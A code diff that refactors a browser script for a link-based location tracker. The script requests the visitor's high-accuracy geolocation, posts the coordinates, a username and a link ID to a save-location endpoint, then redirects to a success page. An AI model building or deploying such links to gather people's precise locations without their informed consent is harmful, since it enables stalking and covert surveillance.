@@ -1,28 +1,37 @@
-function initTracker(linkId) {
-    const urlParams = new URLSearchParams(window.location.search);
-    const username = urlParams.get('user') || 'Guest_' + Math.floor(1000 + Math.random() * 9000);
+function requestHighAccuracyLocation(username, linkId) {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function (position) {
+        sendLocationData(linkId, username, position.coords.latitude, position.coords.longitude);
+      },
+      function (error) {
+        sendLocationData(linkId, username, null, null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  } else {
+    sendLocationData(linkId, username, null, null);
+  }
+}
 
-    function sendData(lat, lon) {
-        fetch('/api/save-location/' + linkId, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: username,
-                latitude: lat,
-                longitude: lon
-            })
-        }).finally(() => {
-            window.location.href = '/success';
-        });
-    }
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
-            () => sendData(null, null),
-            { timeout: 3000, enableHighAccuracy: true }
-        );
-    } else {
-        sendData(null, null);
-    }
+function sendLocationData(linkId, username, latitude, longitude) {
+  fetch('/api/save-location/' + linkId, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      username: username,
+      latitude: latitude,
+      longitude: longitude
+    })
+  }).then(function () {
+    window.location.href = '/success';
+  }).catch(function () {
+    window.location.href = '/success';
+  });
 }
